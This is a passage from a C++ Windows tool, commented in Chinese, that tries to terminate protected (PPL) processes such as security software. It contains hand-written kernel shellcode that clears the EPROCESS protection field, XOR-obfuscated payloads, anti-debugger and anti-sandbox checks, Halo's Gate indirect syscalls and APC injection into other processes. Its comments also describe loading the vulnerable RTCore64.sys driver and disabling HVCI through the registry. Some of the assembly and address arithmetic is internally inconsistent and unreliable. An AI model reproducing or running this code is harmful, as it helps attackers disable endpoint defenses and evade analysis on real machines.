    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x1F,                           // jmp +31 (跳到found)
    
    0x48, 0x8D, 0x83, 0x8A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x68A] (Win10 1803)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x82, 0x06, 0x00, 0x00, // lea rax, [rbx+0x682] (Win10 1709)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x7A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x67A] (Win10 1703)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x6A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x66A] (Win10 1607)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x62, 0x06, 0x00, 0x00, // lea rax, [rbx+0x662] (Win10 1511)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x5A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x65A] (Win10 1507)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x42, 0x06, 0x00, 0x00, // lea rax, [rbx+0x642] (Win8.1)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x3A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x63A] (Win8)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x2A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x62A] (Win7 SP1)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x0E,                           // jne +14 (跳到use_default)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x4C,                           // jmp +76 (跳到found)
    
    // === Win11 偏移量（EPROCESS结构已显著扩展）===
    0x48, 0x8D, 0x83, 0xB8, 0x08, 0x00, 0x00, // lea rax, [rbx+0x8B8] (Win11 24H2/26100+)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x35,                           // jmp +53 (跳到found)
    
    0x48, 0x8D, 0x83, 0xB0, 0x08, 0x00, 0x00, // lea rax, [rbx+0x8B0] (Win11 23H2/25300+)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x28,                           // jmp +40 (跳到found)
    
    0x48, 0x8D, 0x83, 0x80, 0x08, 0x00, 0x00, // lea rax, [rbx+0x880] (Win11 22H2/22621)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x1B,                           // jmp +27 (跳到found)
    
    0x48, 0x8D, 0x83, 0x78, 0x08, 0x00, 0x00, // lea rax, [rbx+0x878] (Win11 21H2/22000)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    // use_default: 默认使用Win10 1903+偏移
    0x48, 0x8D, 0x83, 0xA2, 0x06, 0x00, 0x00, // lea rax, [rbx+0x6A2]
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    
    // found:
    // 清除PPL保护标志
    0xC6, 0x02, 0x00,                     // mov byte [rdx], 0 (将Protection字段设为0)
    
    // 调用PsTerminateProcess终止进程
    // 假设PsTerminateProcess的地址在R8中传递
    0x48, 0x89, 0xD9,                     // mov rcx, rbx (EPROCESS指针)
    0xB8, 0x00, 0x00, 0x00, 0x00,         // mov eax, 0 (退出代码)
    0x48, 0x8B, 0xC8,                     // mov rcx, rax
    0x48, 0x8B, 0xC3,                     // mov rax, rbx
    0x49, 0x89, 0xC0,                     // mov r8, rax
    0x48, 0x89, 0xCB,                     // mov rbx, rcx
    0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
    0x48, 0x89, 0xD8,                     // mov rax, rbx
    0x49, 0xFF, 0xD0,                     // call r8
    
    // 成功返回
    0x48, 0x31, 0xC0,                     // xor rax, rax
    0xEB, 0x10,                           // jmp +16 (跳到exit)
    
    // error: 错误返回
    0x48, 0xC7, 0xC0, 0xC1, 0x00, 0x00, 0xC0, // mov rax, 0xC0000001 (STATUS_UNSUCCESSFUL)
    
    // exit: 恢复寄存器
    0x9D,                                 // popfq
    0x41, 0x5F,                           // pop r15
    0x41, 0x5E,                           // pop r14
    0x41, 0x5D,                           // pop r13
    0x41, 0x5C,                           // pop r12
    0x48, 0x8B, 0x7C, 0x24, 0x28,        // mov rdi, [rsp+40]
    0x48, 0x8B, 0x74, 0x24, 0x20,        // mov rsi, [rsp+32]
    0x48, 0x8B, 0x5C, 0x24, 0x18,        // mov rbx, [rsp+24]
    0x48, 0x8B, 0x54, 0x24, 0x10,        // mov rdx, [rsp+16]
    0x48, 0x8B, 0x4C, 0x24, 0x08,        // mov rcx, [rsp+8]
    0xC3                                  // ret
};

// ShellCode解密函数
static void DecryptShellCode(unsigned char* shellcode, SIZE_T size, unsigned char key) {
    for (SIZE_T i = 0; i < size; i++) {
        shellcode[i] ^= key;
    }
}

// 内存RAII包装器
struct ScopedVirtualMemory {
    PVOID ptr;
    SIZE_T size;
    
    ScopedVirtualMemory(SIZE_T s) : ptr(nullptr), size(s) {}
    
    bool Allocate(ULONG protect) {
        ptr = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, protect);
        return ptr != nullptr;
    }
    
    bool ChangeProtection(ULONG newProtect) {
        DWORD oldProtect;
        return VirtualProtect(ptr, size, newProtect, &oldProtect) != FALSE;
    }
    
    ~ScopedVirtualMemory() {
        if (ptr) {
            VirtualFree(ptr, 0, MEM_RELEASE);
        }
    }
};

// 加载内核ShellCode（改进版）
bool ProcessTerminator::LoadKernelShellCode(PVOID shellcode, SIZE_T size) {
#ifdef _WIN32
    try {
        ScopedVirtualMemory memory(size);
        
        // 第一阶段：分配RW内存并复制ShellCode
        if (!memory.Allocate(PAGE_READWRITE)) {
            return false;
        }
        
        memcpy(memory.ptr, shellcode, size);
        
        // 解密ShellCode
        DecryptShellCode((unsigned char*)memory.ptr, size, 0xAA);
        
        // 第二阶段：改为RX执行
        if (!memory.ChangeProtection(PAGE_EXECUTE_READ)) {
            return false;
        }
        
        return true;
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 反检测函数
static bool IsDebuggerDetected() {
#ifdef _WIN32
    // 方法1: 检查BeingDebugged标志
    typedef BOOL (WINAPI* _CheckRemoteDebuggerPresent)(HANDLE, PBOOL);
    HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
    if (!kernel32) return false;
    
    _CheckRemoteDebuggerPresent pCheckRemoteDebuggerPresent = (_CheckRemoteDebuggerPresent)GetProcAddress(kernel32, "CheckRemoteDebuggerPresent");
    if (pCheckRemoteDebuggerPresent) {
        BOOL isDebugged = FALSE;
        if (pCheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged) && isDebugged) {
            return true;
        }
    }
    
    // 方法2: 检查IsDebuggerPresent
    typedef BOOL (WINAPI* _IsDebuggerPresent)();
    _IsDebuggerPresent pIsDebuggerPresent = (_IsDebuggerPresent)GetProcAddress(kernel32, "IsDebuggerPresent");
    if (pIsDebuggerPresent) {
        if (pIsDebuggerPresent()) return true;
    }
#endif
    return false;
}

static bool IsSandbox() {
#ifdef _WIN32
    // 检查沙箱特征
    const wchar_t* sandboxPaths[] = {
        L"C:\\sandbox\\",
        L"C:\\vbox\\",
        L"C:\\vmware\\",
        L"C:\\windows\\system32\\drivers\\vmmouse.sys",
        L"C:\\windows\\system32\\drivers\\vmhgfs.sys"
    };
    
    for (const wchar_t* path : sandboxPaths) {
        if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
    }
#endif
    return false;
}

// Windows版本检测
static DWORD GetWindowsVersion() {
    typedef NTSTATUS (NTAPI* _RtlGetVersion)(PRTL_OSVERSIONINFOEXW);
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return 0;
    
    _RtlGetVersion pRtlGetVersion = (_RtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
    if (!pRtlGetVersion) return 0;
    
    RTL_OSVERSIONINFOEXW versionInfo = { 0 };
    versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
    
    NTSTATUS status = pRtlGetVersion(&versionInfo);
    if (!NT_SUCCESS(status)) return 0;
    
    return versionInfo.dwBuildNumber;
}

// Halo's Gate算法 - 动态查找syscall地址
static bool FindSyscallAddress(UINT_PTR* syscallAddress, UINT_PTR* ssdtIndex) {
#ifdef _WIN32
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return false;
    
    // 获取NtTerminateProcess地址
    typedef NTSTATUS (NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);
    _NtTerminateProcess pNtTerminateProcess = (_NtTerminateProcess)GetProcAddress(ntdll, "NtTerminateProcess");
    if (!pNtTerminateProcess) return false;
    
    // 解析函数查找SSN（System Service Number）
    // Halo's Gate算法：通过分析函数开头的指令序列来确定SSN
    unsigned char* funcPtr = (unsigned char*)pNtTerminateProcess;
    
    // 查找mov eax, imm32指令（SSN通常在eax中）
    for (int i = 0; i < 32; i++) {
        if (funcPtr[i] == 0xB8) { // mov eax, imm32
            *ssdtIndex = *(UINT_PTR*)(funcPtr + i + 1);
            break;
        }
    }
    
    if (*ssdtIndex == 0) return false;
    
    // 计算syscall地址
    // 在64位Windows中，syscall地址 = ntoskrnl_base + (SSN * 8)
    // 在32位Windows中，syscall地址 = KeServiceDescriptorTable + (SSN * 4)
    
    // 获取ntoskrnl.exe基址
    typedef NTSTATUS (NTAPI* _NtQuerySystemInformation)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength);
    
    _NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQuerySystemInformation) return false;
    
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG Reserved1;
        ULONG Reserved2;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT PathLength;
        CHAR ImageName[256];
    } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
    
    typedef struct _SYSTEM_MODULE_INFORMATION_EX {
        ULONG ModulesCount;
        SYSTEM_MODULE_INFORMATION Modules[1];
    } SYSTEM_MODULE_INFORMATION_EX, *PSYSTEM_MODULE_INFORMATION_EX;
    
    ULONG bufferSize = 0;
    NTSTATUS status = pNtQuerySystemInformation(11, nullptr, 0, &bufferSize);
    if (status != 0xC0000004) return false;
    
    PSYSTEM_MODULE_INFORMATION_EX moduleInfo = (PSYSTEM_MODULE_INFORMATION_EX)malloc(bufferSize);
    if (!moduleInfo) return false;
    
    status = pNtQuerySystemInformation(11, moduleInfo, bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        free(moduleInfo);
        return false;
    }
    
    PVOID ntoskrnlBase = moduleInfo->Modules[0].ImageBase;
    free(moduleInfo);
    
#ifdef _WIN64
    // 64位：syscall地址 = ntoskrnl_base + (SSN * 8)
    *syscallAddress = (UINT_PTR)ntoskrnlBase + (*ssdtIndex * 8);
#else
    // 32位：syscall地址 = KeServiceDescriptorTable + (SSN * 4)
    // 需要获取KeServiceDescriptorTable地址
    HMODULE ntoskrnl = LoadLibraryEx(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntoskrnl) return false;
    
    PVOID KeServiceDescriptorTable = (PVOID)GetProcAddress(ntoskrnl, "KeServiceDescriptorTable");
    if (!KeServiceDescriptorTable) {
        FreeLibrary(ntoskrnl);
        return false;
    }
    
    // KeServiceDescriptorTable指向SSDT基址
    *syscallAddress = (UINT_PTR)KeServiceDescriptorTable + (*ssdtIndex * 4);
    FreeLibrary(ntoskrnl);
#endif
    
    return true;
#else
    return false;
#endif
}

// 64位Indirect Syscall ShellCode（Halo's Gate）
static const unsigned char IndirectSyscallShellCode_x64[] = {
    // ShellCode入口
    // 保存寄存器
    0x48, 0x89, 0x4C, 0x24, 0x08,        // mov [rsp+8], rcx
    0x48, 0x89, 0x54, 0x24, 0x10,        // mov [rsp+16], rdx
    0x48, 0x89, 0x5C, 0x24, 0x18,        // mov [rsp+24], rbx
    0x48, 0x89, 0x74, 0x24, 0x20,        // mov [rsp+32], rsi
    0x48, 0x89, 0x7C, 0x24, 0x28,        // mov [rsp+40], rdi
    0x41, 0x54,                           // push r12
    0x41, 0x55,                           // push r13
    0x41, 0x56,                           // push r14
    0x41, 0x57,                           // push r15
    0x9C,                                 // pushfq
    
    // Halo's Gate：动态查找syscall地址
    // 假设syscall地址已经在R10中传递
    // 假设SSN已经在R11中传递
    
    // 设置参数
    // RCX: EPROCESS指针（目标进程）
    // RDX: 退出代码（0）
    
    // 执行Indirect Syscall
    0x4C, 0x8B, 0xD2,                     // mov r10, rdx (syscall地址)
    0x49, 0x8B, 0xC3,                     // mov r8, r11 (SSN)
    0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0 (退出代码)
    0x48, 0x8B, 0xCB,                     // mov rcx, rbx (EPROCESS指针)
    0xFF, 0xD2,                           // call rdx (执行syscall)
    
    // 成功返回
    0x48, 0x31, 0xC0,                     // xor rax, rax
    0xEB, 0x10,                           // jmp +16 (跳到exit)
    
    // 错误返回
    0x48, 0xC7, 0xC0, 0xC1, 0x00, 0x00, 0xC0, // mov rax, 0xC0000001 (STATUS_UNSUCCESSFUL)
    
    // exit: 恢复寄存器
    0x9D,                                 // popfq
    0x41, 0x5F,                           // pop r15
    0x41, 0x5E,                           // pop r14
    0x41, 0x5D,                           // pop r13
    0x41, 0x5C,                           // pop r12
    0x48, 0x8B, 0x7C, 0x24, 0x28,        // mov rdi, [rsp+40]
    0x48, 0x8B, 0x74, 0x24, 0x20,        // mov rsi, [rsp+32]
    0x48, 0x8B, 0x5C, 0x24, 0x18,        // mov rbx, [rsp+24]
    0x48, 0x8B, 0x54, 0x24, 0x10,        // mov rdx, [rsp+16]
    0x48, 0x8B, 0x4C, 0x24, 0x08,        // mov rcx, [rsp+8]
    0xC3                                  // ret
};

// ShellCode大小常量
static const SIZE_T IndirectSyscallShellCode_x64_size = sizeof(IndirectSyscallShellCode_x64);

// 32位Indirect Syscall ShellCode（Halo's Gate）
static const unsigned char IndirectSyscallShellCode_x86[] = {
    // ShellCode入口
    // 保存寄存器
    0x89, 0x4C, 0x24, 0x04,              // mov [esp+4], ecx
    0x89, 0x54, 0x24, 0x08,              // mov [esp+8], edx
    0x89, 0x5C, 0x24, 0x0C,              // mov [esp+12], ebx
    0x89, 0x74, 0x24, 0x10,              // mov [esp+16], esi
    0x89, 0x7C, 0x24, 0x14,              // mov [esp+20], edi
    0x9C,                                // pushfd
    
    // Halo's Gate：动态查找syscall地址
    // 假设syscall地址已经在EDX中传递
    // 假设SSN已经在EAX中传递
    
    // 设置参数
    // ECX: EPROCESS指针（目标进程）
    // EDX: 退出代码（0）
    
    // 执行Indirect Syscall
    0x8B, 0xD0,                           // mov eax, edx (syscall地址)
    0xB8, 0x00, 0x00, 0x00, 0x00,         // mov eax, 0 (退出代码)
    0x8B, 0xCB,                           // mov ecx, ebx (EPROCESS指针)
    0xFF, 0xD0,                           // call eax (执行syscall)
    
    // 成功返回
    0x31, 0xC0,                           // xor eax, eax
    0xEB, 0x0A,                           // jmp +10 (跳到exit)
    
    // 错误返回
    0xB8, 0x01, 0x00, 0x00, 0xC0,         // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
    
    // exit: 恢复寄存器
    0x9D,                                // popfd
    0x8B, 0x7C, 0x24, 0x14,              // mov edi, [esp+20]
    0x8B, 0x74, 0x24, 0x10,              // mov esi, [esp+16]
    0x8B, 0x5C, 0x24, 0x0C,              // mov ebx, [esp+12]
    0x8B, 0x54, 0x24, 0x08,              // mov edx, [esp+8]
    0x8B, 0x4C, 0x24, 0x04,              // mov ecx, [esp+4]
    0xC3                                  // ret
};

// APC注入函数（修复内存泄漏和执行问题）
static bool InjectViaAPC(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize) {
#ifdef _WIN32
    typedef NTSTATUS (NTAPI* _NtQueueApcThread)(
        HANDLE ThreadHandle,
        PVOID ApcRoutine,
        PVOID ApcRoutineContext,
        PVOID ApcReserved,
        ULONG ApcArgument1,
        ULONG ApcArgument2,
        ULONG ApcArgument3);
    
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return false;
    
    _NtQueueApcThread pNtQueueApcThread = (_NtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
    if (!pNtQueueApcThread) return false;
    
    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, targetPid);
    if (!hProcess) return false;
    
    // 在目标进程分配内存
    PVOID remoteShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        CloseHandle(hProcess);
        return false;
    }
    
    // 写入ShellCode
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // 修改内存保护为可执行
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remoteShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // 枚举目标进程的线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(THREADENTRY32);
    
    bool injected = false;
    HANDLE hInjectedThread = nullptr;
    
    while (Thread32Next(hSnapshot, &te)) {
        if (te.th32OwnerProcessID == targetPid) {
            // 打开线程（THREAD_SET_CONTEXT权限）
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (hThread) {
                // 使用NtQueueApcThread注入APC
                // 绕过R3钩子
                NTSTATUS status = pNtQueueApcThread(
                    hThread,
                    (PVOID)remoteShellcode,
                    nullptr,
                    nullptr,
                    0,
                    0,
                    0);
                
                if (NT_SUCCESS(status)) {
                    injected = true;
                    hInjectedThread = hThread;
                    break;
                }
                
                CloseHandle(hThread);
            }
        }
    }
    
    CloseHandle(hSnapshot);
    
    // 修复内存泄漏：无论注入是否成功，都释放内存和句柄
    VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
    
    if (hInjectedThread) {
        CloseHandle(hInjectedThread);
    }
    
    CloseHandle(hProcess);
    return injected;
#else
    return false;
#endif
}

// 执行内核ShellCode终止PPL进程（改进版：反检测+稳定性增强）
bool ProcessTerminator::ExecuteKernelShellCode(DWORD targetPid) {
#ifdef _WIN32
    try {
        // 反检测检查
        if (IsDebuggerDetected() || IsSandbox()) {
            return false;
        }
        
        // 获取Windows版本
        DWORD winVersion = GetWindowsVersion();
        
        // 获取内核API地址
        HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
        if (!ntdll) return false;
        
        // 获取PsLookupProcessByProcessId地址（未导出，需要通过其他方式获取）
        // 这里使用NtQuerySystemInformation获取内核地址
        typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
            ULONG SystemInformationClass,
            PVOID SystemInformation,
            ULONG SystemInformationLength,
            PULONG ReturnLength
        );
        
        _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
        if (!NtQuerySystemInformation) return false;
        
        // 获取系统模块信息
        typedef struct _SYSTEM_MODULE_INFORMATION {
            ULONG Reserved1;
            ULONG Reserved2;
            PVOID ImageBase;
            ULONG ImageSize;
            ULONG Flags;
            USHORT LoadOrderIndex;
            USHORT InitOrderIndex;
            USHORT LoadCount;
            USHORT PathLength;
            CHAR ImageName[256];
        } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
        
        typedef struct _SYSTEM_MODULE_INFORMATION_EX {
            ULONG ModulesCount;
            SYSTEM_MODULE_INFORMATION Modules[1];
        } SYSTEM_MODULE_INFORMATION_EX, *PSYSTEM_MODULE_INFORMATION_EX;
        
        ULONG bufferSize = 0;
        NTSTATUS status = NtQuerySystemInformation(11, nullptr, 0, &bufferSize);
        if (status != 0xC0000004) return false;
        
        PSYSTEM_MODULE_INFORMATION_EX moduleInfo = (PSYSTEM_MODULE_INFORMATION_EX)malloc(bufferSize);
        if (!moduleInfo) return false;
        
        status = NtQuerySystemInformation(11, moduleInfo, bufferSize, &bufferSize);
        if (!NT_SUCCESS(status)) {
            free(moduleInfo);
            return false;
        }
        
        // 获取ntoskrnl.exe基址
        PVOID ntoskrnlBase = moduleInfo->Modules[0].ImageBase;
        free(moduleInfo);
        
        // 获取ntoskrnl.exe句柄
        HMODULE ntoskrnl = LoadLibraryEx(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
        if (!ntoskrnl) return false;
        
        // 计算PsLookupProcessByProcessId和PsTerminateProcess的内核地址
        PVOID PsLookupProcessByProcessIdUser = (PVOID)GetProcAddress(ntoskrnl, "PsLookupProcessByProcessId");
        PVOID PsTerminateProcessUser = (PVOID)GetProcAddress(ntoskrnl, "PsTerminateProcess");
        
        if (!PsLookupProcessByProcessIdUser || !PsTerminateProcessUser) {
            FreeLibrary(ntoskrnl);
            return false;
        }
        
        UINT_PTR PsLookupProcessByProcessIdKernel = (UINT_PTR)ntoskrnlBase + ((UINT_PTR)PsLookupProcessByProcessIdUser - (UINT_PTR)ntoskrnl);
        UINT_PTR PsTerminateProcessKernel = (UINT_PTR)ntoskrnlBase + ((UINT_PTR)PsTerminateProcessUser - (UINT_PTR)ntoskrnl);
        
        FreeLibrary(ntoskrnl);
        
        // 准备ShellCode参数
        // RCX: 目标PID
        // RDX: PsLookupProcessByProcessId内核地址
        // R8: PsTerminateProcess内核地址
        
        // 加载并执行混淆的ShellCode
        SIZE_T shellcodeSize = sizeof(PPLBypassShellCode_Obfuscated);
        if (!LoadKernelShellCode((PVOID)PPLBypassShellCode_Obfuscated, shellcodeSize)) {
            return false;
        }
        
        // 方法1: 尝试使用NtTerminateProcess
        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, targetPid);
        if (hProcess) {
            typedef NTSTATUS(NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);
            _NtTerminateProcess NtTerminateProcess = (_NtTerminateProcess)GetProcAddress(ntdll, "NtTerminateProcess");
            
            if (NtTerminateProcess) {
                NTSTATUS status = NtTerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                return NT_SUCCESS(status);
            }
            CloseHandle(hProcess);
        }
        
        // 方法2: 尝试通过进程句柄克隆
        // 需要找到具有足够权限的进程来克隆句柄
        
        // 方法3: 使用系统服务描述符表（SSDT）直接调用内核函数
        // 这需要更复杂的实现
        
        return false;
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// PPL绕过主函数
bool ProcessTerminator::terminateByPPLBypass(const std::string& processName) {
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        // 在文件顶部统一 include "ppl_driver.h" 之后, 启用内核驱动方式 PPL 绕过
        // 若 HVCI 已被本进程关闭 -> DriverSession 析构会清理驱动文件
        for (int pid : pids) {
            // ============= [方法前置] 每个方法前都先去除 PPL =============
            //   目标: 防止目标进程在绕过间隙中重新进入 PPL
            //   实现: 复用同一份 PplDriver::DisablePplForPid
            //   失败时静默 (驱动未加载/进程死亡) -> 继续后续方法
            {
                int preCheckRet = PplDriver::DisablePplForPid((DWORD)pid);
                if (preCheckRet == -1) {
                    wprintf(L"[PPL] 已禁用拦截 (需重启)\n");
                } else if (preCheckRet == -3) {
                    wprintf(L"[PPL] WDAC 已启用, 需手动重启关闭\n");
                }
            }

            // 方法1: 尝试使用内核ShellCode
            if (ExecuteKernelShellCode(pid)) {
                if (!isProcessRunning(processName)) return true;
            }

            // [方法前置2] 方法2 前再次去除 PPL (PPL 可能被其他进程恢复)
            PplDriver::DisablePplForPid((DWORD)pid);

            // 方法2: 内核驱动方式 (PplDriver 命名空间)
            //   - 自动探测 HVCI; 已启用则写注册表关闭 + 提示重启
            //   - 自动加载 RTCore64.sys 驱动 (Base64 内嵌, 不常驻)
            //   - 自动遍历 EPROCESS 清零 SignatureLevel
            //   - 任一异常 RAII 自动清理
            {
                int pplRet = PplDriver::DisablePplForPid((DWORD)pid);
                if (pplRet == -1) {
                    // HVCI 已写入注册表 (Enabled=0), 但需重启生效
                    // 在 cmd 环境下只输出提示, 不阻断后续兜底链
                    wprintf(L"[PPL] 已禁用 HVCI 注册表项, 重启后即可使用驱动方式绕过 PPL.\n");
                } else if (pplRet == 1) {
                    // PPL 已清, 立即用 TerminateProcess 结束
                    HANDLE hT = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hT) {
                        TerminateProcess(hT, 0);
                        CloseHandle(hT);
                    }
                    if (!isProcessRunning(processName)) return true;
                }
            }

            // 方法3: 连续多次移除PPL保护 + 使用csrss.exe结束进程
            // 循环30次，每次循环尝试1次PPL移除和2次终止进程，无输出
            for (int i = 0; i < 30; i++) {
                // [方法前置3] 每次循环都先去除 PPL
                PplDriver::DisablePplForPid((DWORD)pid);

                // 获取csrss.exe的PID
                std::vector<int> csrssPids = getPIDsByName("csrss.exe");
                if (!csrssPids.empty()) {
                    int csrssPid = csrssPids[0];
                    
                    // 尝试通过csrss.exe获取目标进程句柄
                    HANDLE hCsrss = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, csrssPid);
                    if (hCsrss) {
                        // 使用csrss.exe的权限来终止目标进程
                        typedef HANDLE (WINAPI* _OpenProcess)(
                            DWORD dwDesiredAccess,
                            BOOL bInheritHandle,
                            DWORD dwProcessId);
                        
                        _OpenProcess pOpenProcess = (_OpenProcess)GetProcAddress(
                            GetModuleHandle(L"kernel32.dll"), "OpenProcess");
                        
                        if (pOpenProcess) {
                            HANDLE hTargetProcess = pOpenProcess(
                                PROCESS_TERMINATE | PROCESS_VM_WRITE,
                                FALSE,
                                pid);
                            
                            if (hTargetProcess) {
                                // 每次循环尝试1次移除PPL保护
                                typedef NTSTATUS(NTAPI* _NtSetInformationProcess)(
                                    HANDLE ProcessHandle,
                                    ULONG ProcessInformationClass,
                                    PVOID ProcessInformation,
                                    ULONG ProcessInformationLength);
                                
                                _NtSetInformationProcess pNtSetInformationProcess =
                                    (_NtSetInformationProcess)GetProcAddress(
                                        GetModuleHandle(L"ntdll.dll"),
                                        "NtSetInformationProcess");
                                
                                if (pNtSetInformationProcess) {
                                    // 强力移除PPL保护且不可恢复
                                    
                                    // 方法1: 移除PPL保护标志 (0x3B)
                                    PS_PROTECTION_V2 psProtection = { 0 };
                                    psProtection.Type = 0;
                                    psProtection.Protection = 0;
                                    
                                    pNtSetInformationProcess(
                                        hTargetProcess,
                                        0x3B,
                                        &psProtection,
                                        sizeof(psProtection));
                                    
                                    // 方法2: 移除进程终止中断标志 (0x1D)
